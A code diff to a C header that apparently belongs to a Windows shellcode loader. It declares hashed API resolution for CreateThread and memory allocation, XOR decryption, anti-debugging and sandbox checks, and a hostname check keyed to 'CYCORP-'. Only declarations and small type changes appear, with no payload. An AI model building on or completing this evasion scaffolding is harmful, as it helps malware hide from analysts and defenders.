@@ -3,13 +3,12 @@
 
 #include <windows.h>
 #include <stdio.h>
+#include <stdint.h>
 
 
 #define HOSTNAME_PREFIX "CYCORP-"
 #define DEBUG_MODE 1
 
-#define TRUE 1
-#define FALSE 0
 
 #define NTDLL_HASH 0x69e00346   // ROL17
 #define KERNEL32_HASH 0x79e0c5e8 // ROL17
@@ -22,12 +21,14 @@
 #define CREATE_THREAD_HASH 0xdd007761 // ROR23
 #define WAIT_FOR_SINGLE_OBJECT_HASH 0xde23aac9 // ROR23
 
+
+
 void XOR(unsigned char *data, size_t len, WORD key);
 
 HMODULE CustomGetModuleHandle(unsigned int module_hash);
 FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash);
 
-BYTE is_being_debugged();
+uint8_t is_being_debugged();
 // BYTE is_being_debugged_alternative();
 // int d();
 int get_disk_size();
@@ -39,6 +40,14 @@ int divide(int a, int b);
 int multiply(int a, int b);
 int add(int a, int b);
 int substract(int a, int b);
+
+typedef enum { false, true } bool;
+
+typedef struct {
+    unsigned int hash;
+    uint8_t rotation_value;
+    bool is_rotation_right;
+} FctHash;
 
 typedef NTSTATUS (NTAPI* NtAllocVirtMem)(
     HANDLE ProcessHandle,
